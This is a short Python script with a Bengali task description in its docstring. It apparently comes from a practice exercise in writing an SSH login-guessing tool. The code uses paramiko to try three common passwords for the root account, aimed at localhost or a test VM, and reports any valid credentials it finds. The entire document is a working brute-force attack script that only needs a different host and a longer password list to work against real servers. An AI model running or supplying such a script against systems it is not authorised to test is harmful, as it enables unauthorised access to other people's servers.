"""টাস্ক: একটি SSH লগইন ট্রাই স্ক্রিপ্ট তৈরি করো।

টার্গেট হোস্ট: host = "127.0.0.1" (বা তোমার কোনো টেস্টিং লিনাক্স সার্ভার/ভিএম থাকলে সেটির আইপি দিতে পারো)।

টার্গেট ইউজারনেম: username = "root"

৩টি সম্ভাব্য পাসওয়ার্ডের একটি লিস্ট বানাও: passwords = ["123456", "admin", "toor"]

লুপ চালিয়ে প্রতিটি পাসওয়ার্ড দিয়ে ssh.connect() করার চেষ্টা করো।

try-except ব্লকে:

যদি paramiko.AuthenticationException হয়, তবে প্রিন্ট করবে: [-] Failed password: {pwd}

যদি কানেকশন সফল হয়, তবে প্রিন্ট করবে: [+] Success! Found valid credentials -> {username}:{pwd} এবং ssh.close() করে লুপ থামিয়ে (break) দেবে।

কানেকশন ফেইলর বা টাইমআউটের জন্য সাধারণ Exception হ্যান্ডেল করবে।"""

import paramiko

target_host = "127.0.0.1"
port = 22
username = "root"
passwords = ["123456", "admin", "toor"]

for password in passwords:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        print(f"[*] Trying password: {password}")
        ssh.connect(hostname=target_host, port=port, username=username, password=password, timeout=5)
        
        print(f"[+] Success! Found valid credentials -> {username}:{password}")
        ssh.close()
        break

    except paramiko.AuthenticationException:
        print(f"[-] Failed password: {password}")
        ssh.close()
        
    except Exception as e:
        print(f"[-] Connection failed or error occurred: {e}")
        ssh.close()